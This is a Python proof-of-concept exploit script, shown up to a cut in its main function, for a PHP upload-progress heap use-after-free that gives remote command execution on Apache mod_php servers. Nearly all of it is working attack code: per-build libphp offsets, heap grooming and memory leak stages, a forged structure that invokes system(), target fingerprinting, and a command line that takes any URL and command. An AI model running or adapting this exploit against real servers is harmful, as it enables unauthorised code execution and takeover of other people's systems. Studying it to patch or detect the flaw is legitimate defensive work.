#!/usr/bin/env python3
"""CVE-2026-109618: PHP session.upload_progress heap UAF -> command execution.

Target and command are supplied on the command line. The command output is
written to a file in the target's webroot and fetched back over HTTP.

The heap layout is build-specific. Select a profile or pass the three offsets
for the target's libphp.so build. Requires Apache prefork + mod_php.
"""

from __future__ import annotations

import argparse
import http.client
import json
import os
import platform
import re
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass, replace
from pathlib import Path

SID = b"attacksessionid0001"
MAX_CMD = 14
FIXED = {"8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}


@dataclass(frozen=True)
class Profile:
    name: str
    php_version: str
    arch: str
    verified: bool
    rce: bool
    zif: int
    dtor: int
    htdata: int
    stage1_n: int
    stage1_forge_len: int
    stage2_t: int
    stage2_v: int
    pads: tuple
    carrier: bool


# Verified profiles from public php2shell research inventories; each build was
# tested on an isolated lab. A version alone does not identify a build.
PROFILES = {
    "php-8.4.26-amd64": Profile(
        name="php-8.4.26-amd64",
        php_version="8.4.26",
        arch="amd64",
        verified=True,
        rce=True,
        zif=0x465370,
        dtor=0x65EB60,
        htdata=0x690D8,
        stage1_n=841,
        stage1_forge_len=79,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "php-8.5.11-amd64": Profile(
        name="php-8.5.11-amd64",
        php_version="8.5.11",
        arch="amd64",
        verified=True,
        rce=True,
        zif=0x5996E0,
        dtor=0x7B47A0,
        htdata=0x690D8,
        stage1_n=841,
        stage1_forge_len=63,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "php-8.5.11-aarch64": Profile(
        name="php-8.5.11-aarch64",
        php_version="8.5.11",
        arch="aarch64",
        verified=True,
        rce=True,
        zif=0x5314F0,
        dtor=0x761B80,
        htdata=0x690D8,
        stage1_n=841,
        stage1_forge_len=63,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "php-8.5.10-aarch64": Profile(
        name="php-8.5.10-aarch64",
        php_version="8.5.10",
        arch="aarch64",
        verified=True,
        rce=True,
        zif=0x52E130,
        dtor=0x75D360,
        htdata=0x690D8,
        stage1_n=841,
        stage1_forge_len=63,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "php-8.4.25-aarch64": Profile(
        name="php-8.4.25-aarch64",
        php_version="8.4.25",
        arch="aarch64",
        verified=True,
        rce=False,
        zif=0x42FA30,
        dtor=0x637AE0,
        htdata=0x690D8,
        stage1_n=841,
        stage1_forge_len=63,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "php83": Profile(
        name="php83",
        php_version="8.3.x",
        arch="",
        verified=False,
        rce=False,
        zif=0x3AC080,
        dtor=0x49EC50,
        htdata=0x6A0D8,
        stage1_n=841,
        stage1_forge_len=79,
        stage2_t=406,
        stage2_v=16,
        pads=((31, 31),) * 6,
        carrier=True,
    ),
    "lab": Profile(
        name="lab",
        php_version="custom",
        arch="",
        verified=False,
        rce=False,
        zif=0x43A870,
        dtor=0x613C50,
        htdata=0x6E0D8,
        stage1_n=892,
        stage1_forge_len=79,
        stage2_t=443,
        stage2_v=1,
        pads=((8, 7),) + ((7, 7),) * 5,
        carrier=False,
    ),
}
PROFILES["bookworm"] = PROFILES["php-8.4.26-amd64"]


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        name = part["name"].encode() if isinstance(part["name"], str) else part["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            filename = part["filename"].encode() if isinstance(part["filename"], str) else part["filename"]
            out += b'; filename="' + filename + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        data = part["data"]
        if isinstance(data, str):
            data = data.encode()
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_cookie(response: bytes) -> bytes:
    match = re.search(rb"Set-Cookie:\s*PHPSESSID=([^;\r\n]+)", response, re.I)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def chunk_base(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    counts = Counter()
    for index in range(len(raw) - 8):
        value = int.from_bytes(raw[index:index + 8], "little")
        if 0x10000 < value < 0x0001000000000000:
            counts[value & ~0x1FFFFF] += 1
    if not counts:
        return 0
    base, count = counts.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base(raw: bytes, dtor: int) -> int:
    if len(raw) < 16:
        return 0
    pointer = int.from_bytes(raw[8:16], "little")
    if not (0x10000 < pointer < 0x0001000000000000):
        return 0
    if pointer & 0xFFF != dtor & 0xFFF:
        return 0
    base = pointer - dtor
    return base if base & 0xFFF == 0 else 0


class Target:
    def __init__(self, url: str, timeout: float = 30.0, insecure: bool = False):
        parts = urllib.parse.urlsplit(url)
        if parts.scheme not in ("http", "https"):
            raise ValueError("target must be http:// or https://")
        self.scheme = parts.scheme
        self.host = parts.hostname or "127.0.0.1"
        self.port = parts.port or (443 if self.scheme == "https" else 80)
        self.path = parts.path or "/"
        if parts.query:
            self.path += "?" + parts.query
        self.last_path = self.path
        self.timeout = timeout
        self.insecure = insecure

    @property
    def authority(self) -> str:
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"

    def _connect(self) -> socket.socket:
        last = None
        for _ in range(10):
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.scheme == "https":
                    context = ssl.create_default_context()
                    if self.insecure:
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return sock
            except OSError as exc:
                last = exc
                time.sleep(0.3)
        raise ConnectionError(f"cannot connect to {self.authority}: {last}")

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None, extra_headers: dict | None = None) -> bytes:
        extra = dict(extra_headers or {})
        kwargs = {}
        if self.scheme == "https":
            context = ssl.create_default_context()
            if self.insecure:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            kwargs["context"] = context
            connection = http.client.HTTPSConnection(
                self.host, self.port, timeout=timeout or self.timeout, **kwargs
            )
        else:
            connection = http.client.HTTPConnection(
                self.host, self.port, timeout=timeout or self.timeout
            )
        try:
            connection.putrequest(
                "POST", self.path, skip_accept_encoding=True,
                skip_host=any(key.lower() == "host" for key in extra),
            )
            connection.putheader("Content-Type", f"multipart/form-data; boundary={boundary.decode()}")
            connection.putheader("Content-Length", str(len(body)))
            connection.putheader("Connection", "close")
            for key, value in extra.items():
                connection.putheader(key, value)
            connection.endheaders()
            try:
                connection.send(body)
            except (OSError, ssl.SSLError):
                pass
            try:
                response = connection.getresponse()
                data = response.read(read_cap)
                head = f"HTTP/1.1 {response.status} {response.reason}\r\n"
                for key, value in response.getheaders():
                    head += f"{key}: {value}\r\n"
                return head.encode("latin1") + b"\r\n" + data
            except (OSError, ssl.SSLError, http.client.HTTPException):
                return b""
        finally:
            connection.close()

    def get(self, path: str, read_cap: int = 1 << 20, follow: int = 3) -> tuple[int, dict, bytes]:
        if path.startswith("http://") or path.startswith("https://"):
            path = urllib.parse.urlsplit(path).path or "/"
        self.last_path = path
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.authority}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        sock = self._connect()
        sock.settimeout(self.timeout)
        data = bytearray()
        try:
            sock.sendall(request)
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            sock.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        headers = {}
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                key, value = line.split(b":", 1)
                headers[key.decode("latin1").strip().lower()] = value.decode("latin1").strip()
        status = int(match.group(1)) if match else 0
        location = headers.get("location")
        if follow > 0 and status in (301, 302, 303, 307, 308) and location:
            absolute = urllib.parse.urljoin(
                f"{self.scheme}://{self.authority}{path}", location
            )
            parts = urllib.parse.urlsplit(absolute)
            if parts.hostname == self.host and parts.scheme == self.scheme:
                new_path = parts.path or "/"
                if parts.query:
                    new_path += "?" + parts.query
                return self.get(new_path, read_cap, follow - 1)
        return status, headers, body


class Exploit:
    def __init__(self, target: Target, profile: Profile, command: bytes,
                 huge_mb: int = 12, quiet: bool = False):
        self.target = target
        self.profile = profile
        self.command = command
        self.huge_mb = huge_mb
        self.quiet = quiet
        self.last_cookie = b""
        self.last_oom_status = 0
        self.last_oom_memory = False

    def _note_oom(self, response: bytes) -> None:
        match = re.match(rb"HTTP/1\.[01] (\d{3})", response)
        self.last_oom_status = int(match.group(1)) if match else 0
        self.last_oom_memory = b"Allowed memory size" in response

    def log(self, message: str) -> None:
        if not self.quiet:
            print(message, flush=True)

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    @staticmethod
    def _file_part() -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        self.log("[*] rotating worker")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        response = self.target.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                                    timeout=max(90.0, self.target.timeout))
        self._note_oom(response)
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.target.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                         read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def leak_chunk(self) -> int:
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        response = self.target.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                                    timeout=max(90.0, self.target.timeout))
        self._note_oom(response)
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(self.profile.stage1_n):
            value = (f"v{index:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + index), "data": value.encode()})
        forged = bytearray(b"A" * self.profile.stage1_forge_len)
        struct.pack_into("<Q", forged, 0x10, 0x1000)
        forged[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forged)})

        response = self.target.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                                    read_cap=9 << 20)
        self.last_cookie = parse_cookie(response)
        return chunk_base(self.last_cookie)

    def leak_libphp(self) -> int:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.target.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                        timeout=max(90.0, self.target.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(983):
            count = 16 if index == self.profile.stage2_t else 1
            for item in range(count):
                parts.append({
                    "name": f"a{index:04d}[{item}]",
                    "data": b"x" * self.profile.stage2_v,
                })

        response = self.target.post(build_multipart(parts, b"B" * 10), b"B" * 10)
        return libphp_base(parse_cookie(response), self.profile.dtor)

    def fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        command = self.command
        if len(command) > MAX_CMD:
            raise ValueError(f"command is {len(command)} bytes, max {MAX_CMD}")
        ht = bytearray(167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        frame = 0x20
        struct.pack_into("<Q", ht, frame + 0x00, 0)
        struct.pack_into("<Q", ht, frame + 0x08, 0)
        struct.pack_into("<Q", ht, frame + 0x10, zif)
        struct.pack_into("<Q", ht, frame + 0x18, 0)
        struct.pack_into("<Q", ht, frame + 0x20, 0)
        struct.pack_into("<I", ht, frame + 0x28, 0)
        struct.pack_into("<I", ht, frame + 0x2C, 1)
        struct.pack_into("<Q", ht, frame + 0x30, 0)
        struct.pack_into("<Q", ht, frame + 0x38, 0)
        struct.pack_into("<I", ht, frame + 0x40, 0)
        struct.pack_into("<Q", ht, frame + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, frame + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(command))
        ht[0x98:0x98 + len(command)] = command
        ht[0x98 + len(command)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for index, (name_len, value_len) in enumerate(self.profile.pads):
            name = (f"p{index:0{name_len - 1}d}" if name_len > 0 else "")[:name_len]
            parts.append({"name": name, "data": b"V" * value_len})
        parts += [self._file_part(), self._big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.profile.carrier else None
        self.target.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                         timeout=max(90.0, self.target.timeout), extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self.fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.profile.carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for index in range(2):
                parts.append({"name": f"f{index:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for index in range(15):
                parts.append({"name": f"a{index:030d}"[:31], "data": ht})
        else:
            for index in range(15):
                parts.append({"name": f"a{index:030d}"[:31], "data": ht})
            for index in range(2):
                parts.append({"name": f"f{index:02d}", "data": ref})
        self.target.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                         read_cap=65536, timeout=30.0)


def snapshot(path: Path | None):
    if path is None:
        return None
    try:
        stat = path.stat()
        return stat.st_mtime_ns, stat.st_size
    except OSError:
        return None


def read_proof(path: Path | None, before) -> str:
    if path is None:
        return ""
    try:
        stat = path.stat()
    except OSError:
        return ""
    if before is not None and (stat.st_mtime_ns, stat.st_size) == before:
        return ""
    try:
        return path.read_text(errors="replace").strip()
    except OSError:
        return ""


@dataclass
class Fingerprint:
    status: int
    server: str
    powered_by: str
    php_version: str
    sapi: str
    cms: str
    notes: list


def normalize_arch(value: str) -> str:
    value = value.lower()
    if value in ("arm64", "aarch64"):
        return "aarch64"
    if value in ("x86_64", "amd64", "x64"):
        return "amd64"
    return value


def version_tuple(value: str) -> tuple:
    parts = []
    for piece in value.split("."):
        parts.append(int(piece) if piece.isdigit() else 0)
    return tuple(parts)


def fingerprint(target: Target, sapi_override: str) -> Fingerprint:
    status, headers, body = target.get(target.path)
    server = headers.get("server", "")
    powered = headers.get("x-powered-by", "")
    text = body.decode("latin1", errors="replace")
    match = re.search(r"PHP/(\d+\.\d+\.\d+)", powered + " " + server, re.I)
    if not match:
        match = re.search(r"PHP Version\s+(\d+\.\d+\.\d+)", text, re.I)
    version = match.group(1) if match else ""

    server_l = server.lower()
    if sapi_override != "auto":
        sapi = sapi_override
    elif "apache" in server_l and "php" in powered.lower():
        sapi = "mod_php"
    elif any(token in server_l for token in ("nginx", "openresty", "caddy", "lighttpd")):
        sapi = "fpm"
    else:
        sapi = "unknown"

    cms = "unknown"
    lowered = text.lower()
    if "wp-content" in lowered or "wp-includes" in lowered or "wp-json" in lowered:
        cms = "WordPress"
    elif "drupalsettings" in lowered or "drupal.settings" in lowered:
        cms = "Drupal"
    elif "/media/system/js/" in lowered or "com_content" in lowered:
        cms = "Joomla"

    notes = []
    if target.last_path != target.path:
        notes.append(f"redirected to {target.last_path}")
        target.path = target.last_path
    if not version:
        notes.append("PHP version not disclosed")
    if sapi == "mod_php":
        notes.append("SAPI heuristic: Apache + PHP headers")
    if sapi == "fpm":
        notes.append("SAPI heuristic: non-Apache front end")
    return Fingerprint(status, server, powered, version, sapi, cms, notes)


def probe_memory_limit(target: Target, probe_mb: int) -> tuple[int | None, bool | None, str]:
    parts = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "pad", "data": b"P" * (probe_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, b"S" * 17)
    response = target.post(body, b"S" * 17, read_cap=65536,
                           timeout=max(60.0, target.timeout))
    status_match = re.match(rb"HTTP/1\.[01] (\d{3})", response)
    status = int(status_match.group(1)) if status_match else 0
    prefix = f"HTTP {status}: " if status else ""
    text = response.decode("latin1", errors="replace")
    match = re.search(r"Allowed memory size of (\d+) bytes exhausted", text)
    if match:
        return int(match.group(1)), True, prefix + "memory_limit from fatal error"
    if "POST Content-Length" in text or "exceeds the limit" in text:
        return None, None, prefix + "post_max_size rejected the probe; lower --probe-mb"
    if status == 413:
        return None, None, prefix + "front end rejected the body; raise client_max_body_size"
    if status in (401, 403):
        return None, None, prefix + "blocked by auth/WAF"
    if "Fatal error" in text:
        return None, True, prefix + "fatal error without a memory limit"
    return None, None, prefix + "no fatal error; display_errors Off or body not parsed"


def find_profile(version: str, arch: str) -> Profile | None:
    for key, candidate in PROFILES.items():
        if key == "bookworm":
            continue
        if (candidate.php_version == version and candidate.arch == arch
                and candidate.verified and candidate.rce):
            return candidate
    return None


def evaluate(fp: Fingerprint, profile: Profile | None, limit: int | None,
             display: bool | None, args: argparse.Namespace, arch: str) -> tuple[list, list]:
    fails = []
    warns = []

    if args.chain != "109618":
        fails.append("CVE-2026-109619 has no public RCE chain; only leak/probe research is available")

    if 300 <= fp.status < 400:
        fails.append("target returned a redirect; use the final URL")

    if fp.php_version:
        branch = ".".join(fp.php_version.split(".")[:2])
        fixed = FIXED.get(branch)
        if fixed and version_tuple(fp.php_version) >= version_tuple(fixed):
            fails.append(f"PHP {fp.php_version} is fixed (>= {fixed})")
    else:
        fails.append("PHP version not disclosed; pass --php-version")

    if fp.sapi == "fpm":
        fails.append("SAPI looks like FPM; the 109618 chain requires Apache prefork + mod_php")
    elif fp.sapi == "unknown":
        warns.append("SAPI unknown; pass --sapi mod_php if confirmed")

    if profile is None:
        fails.append("no verified RCE profile for this version/arch; pass --profile or --profile-file")
    else:
        if not profile.verified:
            warns.append(f"profile {profile.name} is not verified")
        if not profile.rce:
            fails.append(f"profile {profile.name} has no verified RCE stage")
        if (fp.php_version and profile.php_version not in ("custom", "8.3.x")
                and profile.php_version != fp.php_version):
            fails.append(
                f"profile {profile.name} targets PHP {profile.php_version}, "
                f"detected {fp.php_version}"
            )
        if profile.arch and arch and profile.arch != arch:
            fails.append(f"profile {profile.name} targets {profile.arch}, selected {arch}")

    if limit is not None and args.huge_mb * 1024 * 1024 <= limit:
        warns.append(f"OOM body {args.huge_mb} MiB may not exceed memory_limit {limit} bytes")

    if display is False:
        warns.append("display_errors appears Off; the stage-1 leak may fail")

    return fails, warns


def print_preflight(fp: Fingerprint, limit: int | None, display: bool | None,
                    profile: Profile | None, fails: list, warns: list, note: str) -> None:
    print(f"[*] status: {fp.status}")
    print(f"[*] server: {fp.server or '-'}")
    print(f"[*] powered-by: {fp.powered_by or '-'}")
    print(f"[*] php: {fp.php_version or 'unknown'}")
    print(f"[*] sapi: {fp.sapi} ({'; '.join(fp.notes) or 'no notes'})")
    print(f"[*] cms: {fp.cms}")
    print(f"[*] memory_limit: {limit if limit is not None else 'unknown'} ({note})")
    print(f"[*] display_errors: {display if display is not None else 'unknown'}")
    print("[*] upload_progress: assumed On (default; stage 1 confirms)")
    print("[*] session.use_strict_mode: assumed 0 (default)")
    print(f"[*] profile: {profile.name if profile else 'none'}")
    for warning in warns:
        print(f"[!] {warning}")
    for failure in fails:
        print(f"[-] {failure}")
    print(f"[{'OK' if not fails else 'FAIL'}] preflight")


def blackbox_probe(args: argparse.Namespace) -> int:
    try:
        target = Target(args.target, timeout=args.timeout, insecure=args.insecure)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    if getattr(args, "path", None):
        target.path = args.path

    try:
        fp = fingerprint(target, args.sapi)
    except ConnectionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    print(f"[*] target: {target.scheme}://{target.authority}{target.path}")
    print(f"[*] php: {fp.php_version or 'unknown'}  server: {fp.server or '-'}  sapi: {fp.sapi}")
    print(f"[*] cms: {fp.cms}")

    if args.probe_mb > 0:
        try:
            limit, display, note = probe_memory_limit(target, args.probe_mb)
        except ConnectionError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 2
        print(f"[*] memory probe: {note}")
        if limit is not None:
            print(f"[*] memory_limit: {limit} bytes")
        if display is not None:
            print(f"[*] display_errors: {display}")

    print("[!] black-box Stage 1 probe: sends OOM bodies and may crash workers")

    check_body = build_multipart([{"name": "probe", "data": b"1"}], b"P")
    check_response = target.post(check_body, b"P", read_cap=65536, timeout=args.timeout)
    check_match = re.match(rb"HTTP/1\.[01] (\d{3})", check_response)
    check_status = int(check_match.group(1)) if check_match else 0
    print(f"[*] POST check: HTTP {check_status}")
    if check_status in (401, 403, 404, 405):
        print(
            "[-] POST rejected; the probe did not reach PHP. Use a PHP endpoint "
            "that accepts POST (for example /index.php), not a static page or GET-only route."
        )
        return 2
    if check_status == 0:
        print("[!] POST check got no response; continuing with the OOM probe")

    shapes = [(841, 63), (841, 79), (892, 79), (841, 87), (841, 95), (900, 48)]
    long_cookie = 0
    for index, (n, forge_len) in enumerate(shapes[:args.probe_max], 1):
        profile = Profile(
            name=f"probe-{n}-{forge_len}",
            php_version="",
            arch="",
            verified=False,
            rce=False,
            zif=0,
            dtor=0,
            htdata=0,
            stage1_n=n,
            stage1_forge_len=forge_len,
            stage2_t=0,
            stage2_v=0,
            pads=(),
            carrier=False,
        )
        exploit = Exploit(target, profile, b"id", huge_mb=args.huge_mb, quiet=args.quiet)
        print(f"[*] attempt {index}/{min(len(shapes), args.probe_max)}: N={n} forge={forge_len}")
        try:
            exploit.rotate()
            chunk = exploit.leak_chunk()
        except ConnectionError as exc:
            print(f"[-] connection: {exc}")
            break
        cookie = exploit.last_cookie
        oom = f"{exploit.last_oom_status}" + ("/memory" if exploit.last_oom_memory else "")
        print(f"    oom={oom} cookie={len(cookie)} bytes chunk={hex(chunk) if chunk else 'none'}")
        if chunk:
            print("LEAK_CONFIRMED")
            print(f"    chunk_base=0x{chunk:x}")
            print(f"    cookie_len={len(cookie)}")
            print(f"    cookie_hex={cookie[:96].hex()}")
            print(f"    shape=N{n},forge={forge_len}")
            return 0
        if exploit.last_oom_status in (401, 403, 404, 405):
            print(
                f"[-] POST rejected (HTTP {exploit.last_oom_status}); "
                "the probe did not reach PHP. Use a PHP endpoint that accepts POST "
                "(for example /index.php), not a static page or a GET-only route."
            )
            return 2
        if len(cookie) >= 512:
            long_cookie = max(long_cookie, len(cookie))
            print(f"    [!] long URL-encoded cookie ({len(cookie)} bytes) but no chunk base parsed")

    if long_cookie:
        print(f"COOKIE_LEAK_UNPARSED (max cookie {long_cookie} bytes)")
        return 2
    print("NO_LEAK_CONFIRMED")
    return 1


def load_profile_file(path: str) -> Profile:
    data = json.loads(Path(path).read_text())
    libphp = data["libphp"]
    stages = data["stages"]
    return Profile(
        name=data.get("name", Path(path).stem),
        php_version=str(data.get("php_version", "")),
        arch=data.get("arch", ""),
        verified=bool(data.get("verified")),
        rce=bool(data.get("rce")),
        zif=int(libphp["zif_system"], 0),
        dtor=int(libphp["zval_ptr_dtor"], 0),
        htdata=int(libphp["htdata"], 0),
        stage1_n=int(stages["stage1_n"]),
        stage1_forge_len=int(stages.get("stage1_forge_len", 79)),
        stage2_t=int(stages["stage2_t"]),
        stage2_v=int(stages["stage2_v"]),
        pads=tuple(tuple(item) for item in stages.get("stage3_pads", [])),
        carrier=bool(stages.get("stage3_carrier", False)),
    )


def list_profiles() -> None:
    seen = set()
    for key, profile in PROFILES.items():
        if profile.name in seen:
            continue
        seen.add(profile.name)
        print(f"{profile.name:<24} php={profile.php_version:<8} arch={profile.arch or '-':<8} "
              f"verified={profile.verified!s:<5} rce={profile.rce!s:<5} "
              f"zif=0x{profile.zif:x} dtor=0x{profile.dtor:x} htdata=0x{profile.htdata:x}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="poc_rce",
        description="CVE-2026-109618 PoC: custom target, custom command, output returned.",
    )
    parser.add_argument("-u", "--target", default=None, help="target URL (http or https)")
    parser.add_argument("-c", "--cmd", default="id", help="command to run (max 14 bytes)")
    parser.add_argument("--fetch", default="/p.txt", help="path to GET for command output")
    parser.add_argument("--proof-file", default="", help="local file to read instead of --fetch")
    parser.add_argument("--profile", choices=tuple(PROFILES), default=None)
    parser.add_argument("--profile-file", default=None, help="JSON profile for an exact build")
    parser.add_argument("--auto", action="store_true", help="fingerprint and gate before exploiting")
    parser.add_argument("--check", action="store_true", help="preflight only, do not exploit")
    parser.add_argument("--probe", action="store_true", help="black-box Stage 1 leak probe, no profile needed")
    parser.add_argument("--probe-max", type=int, default=5, help="number of grooming shapes to try")
    parser.add_argument("--path", default=None, help="override the request path, e.g. /index.php")
    parser.add_argument("--list-profiles", action="store_true")
    parser.add_argument("--arch", choices=("amd64", "aarch64"), default=None)
    parser.add_argument("--php-version", default=None, help="override detected PHP version")
    parser.add_argument("--sapi", choices=("auto", "mod_php", "fpm"), default="auto")
    parser.add_argument("--probe-mb", type=int, default=12, help="OOM probe size; 0 disables")
    parser.add_argument("--chain", choices=("109618", "109619"), default="109618")
    parser.add_argument("--force", action="store_true", help="run despite preflight warnings")
    parser.add_argument("--zif-offset", type=lambda value: int(value, 0), default=None)
    parser.add_argument("--dtor-offset", type=lambda value: int(value, 0), default=None)
    parser.add_argument("--htdata-offset", type=lambda value: int(value, 0), default=None)
    parser.add_argument("--stage1-n", type=int, default=None)
    parser.add_argument("--stage2-t", type=int, default=None)
    parser.add_argument("--stage2-v", type=int, default=None)
    parser.add_argument("--huge-mb", type=int, default=12)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument("--insecure", action="store_true", help="skip TLS verification")
    parser.add_argument("--no-rotate", action="store_true")
    parser.add_argument("-q", "--quiet", action="store_true")
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    if args.list_profiles:
        list_profiles()
        return 0
    if not args.target:
        print("error: --target is required", file=sys.stderr)
        return 2
    if args.probe:
        return blackbox_probe(args)

    command = args.cmd
    if not args.proof_file and ">" not in command:
        command = f"{command}>p.txt"
    if len(command.encode()) > MAX_CMD:
        print(
            f"error: command is {len(command)} bytes after output redirect, max {MAX_CMD}. "
            f"Use a shorter redirect like 'ls>p.txt'.",
            file=sys.stderr,
        )
        return 2

    try:
        target = Target(args.target, timeout=args.timeout, insecure=args.insecure)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    selected = None
    if args.profile_file:
        try:
            selected = load_profile_file(args.profile_file)
        except (OSError, ValueError, KeyError) as exc:
            print(f"error: cannot load profile file: {exc}", file=sys.stderr)
            return 2
    elif args.profile:
        selected = PROFILES[args.profile]

    if args.check or args.auto:
        try:
            fp = fingerprint(target, args.sapi)
        except ConnectionError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 2
        detected_version = fp.php_version
        if args.php_version:
            fp.php_version = args.php_version

        arch = normalize_arch(args.arch or platform.machine())
        limit, display, note = None, None, "probe skipped"
        if args.probe_mb > 0:
            try:
                limit, display, note = probe_memory_limit(target, args.probe_mb)
            except ConnectionError as exc:
                print(f"error: {exc}", file=sys.stderr)
                return 2

        if selected is None:
            selected = find_profile(fp.php_version, arch)

        fails, warns = evaluate(fp, selected, limit, display, args, arch)

        loopback = target.host in ("127.0.0.1", "localhost", "::1")
        if args.auto and not args.arch and not loopback:
            fails.append("remote target: pass --arch amd64 or --arch aarch64")
        if args.php_version and detected_version and detected_version != args.php_version:
            warns.append(
                f"--php-version {args.php_version} overrides detected {detected_version}"
            )

        print_preflight(fp, limit, display, selected, fails, warns, note)

        if limit is not None and args.huge_mb * 1024 * 1024 <= limit:
            needed = limit // (1024 * 1024) + 4
            if args.probe_mb > needed:
